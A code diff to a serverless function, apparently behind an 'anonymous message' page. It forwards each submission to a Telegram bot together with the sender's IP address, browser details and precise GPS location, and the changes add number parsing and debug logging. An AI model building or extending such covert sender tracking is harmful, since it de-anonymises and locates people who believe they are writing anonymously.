@@ -9,8 +9,10 @@ exports.handler = async (event) => {
 
     try {
         const result = await multipart.parse(event);
-        console.log('Parsed incoming data:', result); // <--- ADD THIS LINE
-        const { message, name, emoji, latitude, longitude } = result; // Extract new latitude/longitude
+        // Ensure latitude and longitude are parsed as numbers
+        const latitude = result.latitude ? parseFloat(result.latitude) : null;
+        const longitude = result.longitude ? parseFloat(result.longitude) : null;
+        const { message, name, emoji } = result;
         const files = result.files;
 
         const botToken = process.env.TELEGRAM_BOT_1_TOKEN;
@@ -18,7 +20,11 @@ exports.handler = async (event) => {
 
         const ip = event.headers['x-nf-client-connection-ip'] || 'N/A';
         const userAgent = event.headers['user-agent'] || 'N/A';
-        const network = 'Unknown'; // We don't have a way to reliably get this from client-side or headers without external service
+        const network = 'Unknown'; // Default. Getting precise network provider needs external service.
+
+        // Add this line to log the incoming data for debugging
+        console.log('Parsed incoming data in backend:', { message, name, emoji, latitude, longitude, files: files.map(f => f.filename) });
+
 
         // 1. Format and send the main text message
         let textCaption = `🔵 *New Anonymous Message* 🔵\n\n`;
@@ -30,33 +36,26 @@ exports.handler = async (event) => {
         textCaption += `*Device/Browser:* \`${userAgent}\`\n`;
         textCaption += `*Network:* \`${network}\`\n`; // Added network field
 
-        // Removed the text-based Precise Location as sendLocation will handle the visual part
-        // if (latitude && longitude) {
-        //     const googleMapsLink = `http://maps.google.com/maps?q=${latitude},${longitude}`;
-        //     textCaption += `*Precise Location:* [View on Google Maps](${googleMapsLink})\n`;
-        // } else {
-        //     textCaption += `*Precise Location:* Not shared (or permission denied)\n`;
-        // }
-
-
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chatId, text: textCaption, parse_mode: 'Markdown' }),
         });
 
-        // --- NEW: Send the precise location as a Telegram location message ---
-        if (latitude && longitude) {
+        // --- Send the precise location as a Telegram location message (rich card) ---
+        if (latitude !== null && longitude !== null) { // Check if valid numbers
             await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    latitude: parseFloat(latitude), // Ensure they are numbers
-                    longitude: parseFloat(longitude),
-                    live_period: undefined // Not a live location, just a point
+                    latitude: latitude,
+                    longitude: longitude,
                 }),
             });
+            console.log('Location sent via sendLocation API.');
+        } else {
+            console.log('Location data not available to send via sendLocation API.');
         }
 
 
@@ -72,12 +71,14 @@ exports.handler = async (event) => {
                     method: 'POST',
                     body: form
                 });
+                console.log(`Sent photo: ${file.filename}`);
             } else if (file.contentType.startsWith('audio/')) {
                 form.append('audio', file.content, { filename: file.filename });
                 await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                     method: 'POST',
                     body: form
                 });
+                console.log(`Sent audio: ${file.filename}`);
             }
         }
 
